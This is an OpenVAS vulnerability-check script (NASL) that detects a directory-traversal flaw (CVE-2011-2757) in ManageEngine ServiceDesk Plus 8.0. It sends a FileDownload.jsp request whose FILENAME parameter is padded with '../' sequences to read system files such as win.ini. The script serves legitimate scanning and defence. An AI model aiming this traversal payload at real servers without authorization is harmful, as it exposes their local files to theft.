###############################################################################
# OpenVAS Vulnerability Test
#
# ManageEngine ServiceDesk Plus 'FILENAME' Parameter Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zohocorp:manageengine_servicedesk_plus";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103184");
  script_version("2022-04-28T13:38:57+0000");
  script_tag(name:"last_modification", value:"2022-04-28 13:38:57 +0000 (Thu, 28 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-06-29 13:12:40 +0200 (Wed, 29 Jun 2011)");
  script_cve_id("CVE-2011-2757");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("ManageEngine ServiceDesk Plus 'FILENAME' Parameter Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_manageengine_servicedesk_plus_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("manageengine/servicedesk_plus/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48403");

  script_tag(name:"summary", value:"ManageEngine ServiceDesk Plus is prone to a directory-traversal
  vulnerability because the application fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain arbitrary local
  files in the context of the webserver process.");

  script_tag(name:"affected", value:"ManageEngine ServiceDesk Plus 8.0 is vulnerable. Other versions may
  also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  if( file =~ "(boot|win)\.ini" )
    crap = crap( data:"..\", length:3*9 );
  else
    crap = crap( data:"../", length:3*9 );

  url = dir + "/workorder/FileDownload.jsp?module=agent&FILENAME=" + crap + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
